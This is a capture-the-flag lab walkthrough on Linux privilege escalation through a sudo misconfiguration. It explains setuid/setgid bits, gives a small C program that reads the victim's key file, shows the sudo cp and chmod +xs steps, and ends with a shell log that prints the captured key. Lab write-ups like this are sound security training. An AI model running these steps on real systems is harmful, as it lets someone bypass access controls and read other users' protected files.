In this challenge, we are going to work on more privileges escalation based on misconfigurations of the sudo command.
As before, you can use sudo -l to see what command you're authorized to run.

Here we are going to solve this challenge by creating a setgid program.
This program will run as the victim group once you run it thanks to the setgid bit.

You can see that a program is setuid or setgid by looking at its permissions:

              ls -l /usr/bin/passwd
              -rwsr-xr-x 1 root root 54192 Nov 18 2015 /usr/bin/passwd

In this example, the program /usr/bin/passwd is setuid root as it will run as the user root even if it's started by another user. 
You can see the setuid bit in the output of ls -l with the s in the permissions (instead of x for non-setuid program). 
Setuid root are always a good target as they often allow privileges escalation.

A few years ago, you could exploit this configuration issue by copying a shell (bash a long time ago and ksh more recently) and adding the setuid bit to it. 
Unfortunately most shells will now prevent this attack. But we can still do something similar by writing our own program.

To create this program, you can use the following C code:


        int main(void)
      {
        system("cat /home/victim/key.txt");
      }


You can then compile it:

          gcc -o /tmp/[FILE] [FILE].c

Where [FILE] is the filename.

Then you will need to copy it using the sudo, this will allow you to create a file owned by the victim user. 
Once you copied it, you should be able to set the setuid and setgid flags on it using:


          chmod +xs [FILE]

Where [FILE] is the filename.

Now you can run this program as the pentesterlab and you should be able to get access to the key.txt file thanks to the setgid bit.





sudo -l
sudo -u victim cp /bin/bash /tmp/foo
cd /tmp
ls -ltrh

sudo -u victim chmod +xs foo
ls -ltrh

vi bar.
        int main(void)
      {
        system("cat /home/victim/key.txt");
      }

gcc -o bar bar.c
sudo -u victim cp bar /tmp/foo

sudo -u victim chmod +xs foo
ls -ltr
./foo
1340b7d2-76ce-49c0-9343-11cdf223b572
